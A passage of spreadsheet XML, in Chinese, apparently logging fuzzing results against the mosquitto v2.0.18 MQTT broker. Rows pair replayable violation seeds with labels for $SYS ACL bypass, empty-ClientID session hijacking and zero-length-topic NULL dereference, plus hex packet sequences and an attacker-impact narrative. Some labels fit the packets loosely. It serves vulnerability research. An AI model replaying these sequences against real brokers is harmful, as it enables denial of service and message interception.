          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(1172B)\u000a4.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Sev3\u000a- 违规类别代码: 0x02c6\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E728" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c6 ===\u000a大小: 2645B (报告+请求数据)\u000a请求数据: 1172B\u000a\u000a---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MQTT请求序列(1172B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=267f2626262626262626262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626725f73796e63\u000aMsg[4]: PUBREL PacketID=12140 | raw_header=6c322f6c6576656c332f6c6576656c34\u000aMsg[5]: PUBCOMP PacketID=7 | raw_header=7374000766757a7a5f6331820b000100\u000aMsg[6]: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raw_header=26262626262626ffff26262626262626\u000aMsg[13]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[14]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626260126262626262626\u000aMsg[15]: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(不完整,33B) raw=262626262626262626262626262626262626262626262626262626262626262626\u000a(尾部33B): 262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F7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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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2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29">
      <c r="A729" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B729" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C729" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(1146B)\u000a4.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0x0305\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E729" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 2654B (报告+请求数据)\u000a请求数据: 1146B\u000a\u000a---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MQTT请求序列(1146B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[2]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[3]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[4]: PUBREL PacketID=14065 | raw_header=6b6b36f16b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[5]: PUBCOMP PacketID=31333 | raw_header=757a7a65725f73796e6300027635000b\u000aMsg[6]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[7]: AUTH  | raw_header=fb6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[8]: PUBREL  | raw_header=6b016b\u000aMsg[9]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[10]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[11]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[12]: (不完整,38B) raw=776b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6bff\u000a(尾部38B): 776b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6bff</f>
        <v/>
      </c>
      <c r="F7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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J72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29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30">
      <c r="A730" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0307</t>
        </is>
      </c>
      <c r="B730" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C730" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(583B)\u000a4.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730" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0307 ===\u000a大小: 1419B (报告+请求数据)\u000a请求数据: 583B\u000a\u000a---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MQTT请求序列(583B原始二进制) ---\u000aMsg[1]: CONNACK session_present=124 reason_code=124 | raw_header=21327c7c7f7f7f7f7f7f7f7f7f7f7f5b\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=3 retain=False payload='\x00\x14$shar' | raw_header=3626001d245359532f62726f6b65722f\u000aMsg[3]: PUBREL PacketID=26482 | raw_header=652f677270322f73656e736f722f2300\u000aMsg[4]: PUBREL PacketID=26482 | raw_header=652f677270312f2303001d245359532f\u000aMsg[5]: (不完整,393B) raw=f29a235e2ee99236d22d700bc65900d52e50b481c31c85fa1d25eb6458aa6eeeeeeeeeeeeeeeeeee\u000a(尾部393B): f29a235e2ee99236d22d700bc65900d52e50b481c31c85fa1d25eb6458aa6eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee</f>
        <v/>
      </c>
      <c r="F7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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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3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31">
      <c r="A731" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B731" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C731" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(1604B)\u000a4.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731" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0385 ===\u000a大小: 4614B (报告+请求数据)\u000a请求数据: 1604B\u000a\u000a---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MQTT请求序列(1604B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=045b54ff8420ff0061666c6c6c6c6c6c\u000aMsg[2]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=317f3131313131313131313131313131\u000aMsg[3]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[4]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[6]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[7]: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CONNECT  | raw_header=1600\u000aMsg[11]: (不完整,1023B) raw=139d2a1ac5a05334b79b2af5662683d0edfc486a000178000966757a7a5f75736572823d6be03726\u000a(尾部1023B): 139d2a1ac5a05334b79b2af5662683d0edfc486a000178000966757a7a5f75736572823d6be03726001d245359530c62726f</f>
        <v/>
      </c>
      <c r="F7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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J73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31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32">
      <c r="A732" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0387</t>
        </is>
      </c>
      <c r="B732" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C732" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(1065B)\u000a4.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Sev3\u000a- 违规类别代码: 0x0387\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E732" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0387 ===\u000a大小: 2797B (报告+请求数据)\u000a请求数据: 1065B\u000a\u000a---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MQTT请求序列(1065B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=4 | raw_header=4d5c00044d51545405c2003c28110000\u000aMsg[2]: SUBSCRIBE PacketID=465 Topics=[] | raw_header=827f01d14d26002b766572792f646565\u000aMsg[3]: PUBLISH Topic='\x00\x00\x00\x10c/d/e' QoS=1 retain=True payload_len=94B | raw_header=3b69000900000010632f642f6501d253\u000aMsg[4]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=128B | raw_header=3a9f01001d245359532f62726f6b6572\u000aMsg[5]: PUBLISH Topic='MQTT' QoS=2 retain=False payload_len=86B | raw_header=345c00044d51545405c2003c28110000\u000aMsg[6]: SUBSCRIBE PacketID=1887 Topics=[] | raw_header=821e075f050b9e80e541001324535953\u000aMsg[7]: PUBLISH Topic='se\x07&lt;»\x01\x00\x0bsen' QoS=1 retain=True payload_len=111B | raw_header=337c000b7365073cbb01000b73656e73\u000aMsg[8]: PUBREL PacketID=28270 | raw_header=636f6e6e6563746564b8ada07d9b543e\u000aMsg[9]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=75B | raw_header=316a001d245359532f62726f6b65722f\u000aMsg[10]: PUBLISH Topic='' QoS=2 retain=False payload='\x00\x15ÿ\x7fllo' | raw_header=340900000015ff7f6c6c6f\u000aMsg[11]: PUBLISH Topic='a/b/c\x82&lt;\x01\x0c\x00\u0009a/b/c/d/' QoS=0 retain=True payload='e\x02\x00+very/deep' | raw_header=31220013612f622f63823c010c000961\u000aMsg[12]: (不完整,53B) raw=2f746f7069632f6c6576656c312f6c6576656c322f6c6576656c332f6c6576656c34013346001524\u000a(尾部53B): 2f746f7069632f6c6576656c312f6c6576656c322f6c6576656c332f6c6576656c3401334600152473686172652f2f662f67</f>
        <v/>
      </c>
      <c r="F7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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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32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33">
      <c r="A733" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:03c5</t>
        </is>
      </c>
      <c r="B733" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C733" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D7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将种子文件(id:000009,sev:3,cat:03c5)中的REQUEST DATA提取出来(1379B)\u000a4.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Sev3\u000a- 违规类别代码: 0x03c5\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E733" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:03c5 ===\u000a大小: 3076B (报告+请求数据)\u000a请求数据: 1379B\u000a\u000a---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MQTT请求序列(1379B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=21623 | raw_header=4d5154770420ff6900006c6e65827878\u000aMsg[2]: PUBREL PacketID=53271 | raw_header=652fd017186415000865788a65726e61\u000aMsg[3]: PUBREL PacketID=24929 | raw_header=61616161616161616161616161616161\u000aMsg[4]: PUBREL PacketID=24929 | raw_header=61616161616161616161616161616161\u000aMsg[5]: PUBREL PacketID=24929 | raw_header=61616161616161616161616161616161\u000aMsg[6]: PUBREL PacketID=24929 | raw_header=61616161616161616161616161616126\u000aMsg[7]: PUBREL PacketID=24929 | raw_header=61616161616161616161616161616161\u000aMsg[8]: PUBREL PacketID=24929 | raw_header=61616161616161616161616161616161\u000aMsg[9]: PUBREL PacketID=24929 | raw_header=61616161616161616161616161616161\u000aMsg[10]: PUBREC  | raw_header=5200\u000aMsg[11]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1d245359532f62726f6b65722f636c69\u000aMsg[12]: PUBREL PacketID=26482 | raw_header=652f6772702f746573742f746f706963\u000aMsg[13]: (不完整,465B) raw=dbf51d49f09067000ce7a209df616161616161616161616161616161616161616161616161616161\u000a(尾部465B): dbf51d49f09067000ce7a209df61616161616161616161616161616161616161616161616161616161616161616161616161</f>
        <v/>
      </c>
      <c r="F7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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J73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  <c r="K733" s="9" t="inlineStr">
        <is>
          <t>【会话冒充与消息拦截】攻击者可利用Mosquitto的会话劫持漏洞，使用空ClientID配合clean_session=0接管前一会话的订阅和未消费消息，从而接收本应发送给合法客户端的消息。这在IoT/遥测场景中可能导致关键数据丢失或被篡改。
【拒绝服务与资源劫持】通过大量创建持久会话并占用ClientID资源，攻击者可使合法客户端无法恢复其会话，造成持续性服务中断。
【漏洞可靠性高】AFLNet fuzzing框架已多次重放验证该漏洞的稳定性（标记为replayable），表明攻击者可在真实环境中稳定复现该漏洞，利用成功率较高。</t>
        </is>
      </c>
    </row>
    <row r="734">
      <c r="A734" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B734" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C734" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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34" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 387B (报告+请求数据)\u000a请求数据: 10B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(10B原始二进制) ---\u000aMsg[1]: (不完整,10B) raw=847f7461000000000000\u000a(尾部10B): 847f7461000000000000</f>
        <v/>
      </c>
      <c r="F7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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J73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34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35">
      <c r="A735" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B735" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C735" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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35" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 567B (报告+请求数据)\u000a请求数据: 23B\u000a\u000a---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MQTT请求序列(23B原始二进制) ---\u000aMsg[1]: (不完整,23B) raw=536c760c0c0c0c0c290c0c0c0c0c0c0c0c0c0c0c355f73\u000a(尾部23B): 536c760c0c0c0c0c290c0c0c0c0c0c0c0c0c0c0c355f73</f>
        <v/>
      </c>
      <c r="F7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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J73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35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36">
      <c r="A736" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B736" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C736" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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36" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 861B (报告+请求数据)\u000a请求数据: 164B\u000a\u000a---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MQTT请求序列(164B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=60 Topics=[''(零长度!QoS=0)] | raw_header=8238003c00001c2473686172652f6733\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=2 retain=True payload_len=89B | raw_header=3d66000b73656e736f722f74656d7000\u000aMsg[3]: (不完整,2B) raw=90e4\u000a(尾部2B): 90e4</f>
        <v/>
      </c>
      <c r="F7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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J73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36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37">
      <c r="A737" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B737" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C737" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(194B)\u000a4.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737" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 1113B (报告+请求数据)\u000a请求数据: 194B\u000a\u000a---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TYPE0  | raw_header=00044d020057\u000aMsg[2]: TYPE0  | raw_header=00020057\u000aMsg[3]: SUBSCRIBE PacketID=16 Topics=[''(零长度!QoS=0)] | raw_header=8234001000000010002b766572792f64\u000aMsg[4]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=1 retain=True payload_len=89B | raw_header=3b77001c2473686172652f67332f686f\u000aMsg[5]: TYPE0  | raw_header=000766755a7a5f6332</f>
        <v/>
      </c>
      <c r="F7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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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37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38">
      <c r="A738" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B738" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C738" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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738" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0140 ===\u000a大小: 567B (报告+请求数据)\u000a请求数据: 25B\u000a\u000a---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MQTT请求序列(25B原始二进制) ---\u000aMsg[1]: (不完整,25B) raw=105000044d51545404ea005700000001d9f461633250021afc\u000a(尾部25B): 105000044d51545404ea005700000001d9f461633250021afc</f>
        <v/>
      </c>
      <c r="F7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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J73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38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39">
      <c r="A739" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B739" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C739" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(101B)\u000a4.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739" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0141 ===\u000a大小: 826B (报告+请求数据)\u000a请求数据: 101B\u000a\u000a---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MQTT请求序列(101B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=91 Topics=[''(零长度!QoS=1)] | raw_header=8223005b00001d245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$share/grp1/test/+' QoS=0 retain=False payload_len=41B | raw_header=383d00122473686172652f677270312f\u000aMsg[3]: CONNACK  | raw_header=25</f>
        <v/>
      </c>
      <c r="F7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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J73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3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40">
      <c r="A740" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B740" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C740" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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740" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0142 ===\u000a大小: 787B (报告+请求数据)\u000a请求数据: 94B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(94B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=105c00044d51545405c2003c00000017</f>
        <v/>
      </c>
      <c r="F7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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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0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1">
      <c r="A741" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B741" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C741" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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741" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0143 ===\u000a大小: 985B (报告+请求数据)\u000a请求数据: 114B\u000a\u000a---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MQTT请求序列(114B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2314 Topics=[''(零长度!QoS=1), '$share/grp2/sensor/#'(QoS=0), '+/data'(QoS=2)] | raw_header=8225090a00000100142473686172652f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=51B | raw_header=32480013245359532f62726f6b65722f\u000aMsg[3]: CONNECT  | raw_header=10</f>
        <v/>
      </c>
      <c r="F7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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J74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1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2">
      <c r="A742" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:01c1</t>
        </is>
      </c>
      <c r="B742" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C742" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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742" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c1 ===\u000a大小: 1016B (报告+请求数据)\u000a请求数据: 104B\u000a\u000a---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MQTT请求序列(104B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1136 Topics=['$share/grp2/sensor/#'(QoS=2), ''(零长度!QoS=2), '+/data'(QoS=2)] | raw_header=8225047000142473686172652f677270\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=1 retain=True payload_len=49B | raw_header=3b3e000b73656e736f722f74656d7004\u000aMsg[3]: PUBREC  | raw_header=54</f>
        <v/>
      </c>
      <c r="F7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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J74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42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43">
      <c r="A743" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B743" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C743" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(88B)\u000a4.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743" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c2 ===\u000a大小: 968B (报告+请求数据)\u000a请求数据: 88B\u000a\u000a---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MQTT请求序列(88B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(0B) clean_session=True keepalive=87s [自动清理会话] | raw_header=105000044d5154540502005700000000\u000aMsg[2]: (不完整,6B) raw=87656d70e000\u000a(尾部6B): 87656d70e000</f>
        <v/>
      </c>
      <c r="F7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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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3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4">
      <c r="A744" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:01c3</t>
        </is>
      </c>
      <c r="B744" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C744" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(529B)\u000a4.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0x01c3\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E744" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c3 ===\u000a大小: 1454B (报告+请求数据)\u000a请求数据: 529B\u000a\u000a---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MQTT请求序列(529B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQDD v68 ClientID=''(68B) clean_session=False keepalive=16384s Will=YES [持久会话] | raw_header=105000044d5144444444400000004444\u000aMsg[2]: (不完整,447B) raw=ecff3c86304698b64d11185e161742f83940b0e7e02e82356cf6d913cced56b9b5923fe5d8d89b25\u000a(尾部447B): ecff3c86304698b64d11185e161742f83940b0e7e02e82356cf6d913cced56b9b5923fe5d8d89b25e9b483ffcbc5f7050682</f>
        <v/>
      </c>
      <c r="F7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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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4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5">
      <c r="A745" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B745" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C745" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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45" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 808B (报告+请求数据)\u000a请求数据: 194B\u000a\u000a---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MQTT请求序列(194B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2292 Topics=[''(零长度!QoS=3)] | raw_header=821908f4000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=0 retain=False payload_len=132B | raw_header=30a201001c2473686172652f67332f68\u000aMsg[3]: (不完整,2B) raw=c020\u000a(尾部2B): c020</f>
        <v/>
      </c>
      <c r="F7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5" s="2" t="inlineStr">
        <is>
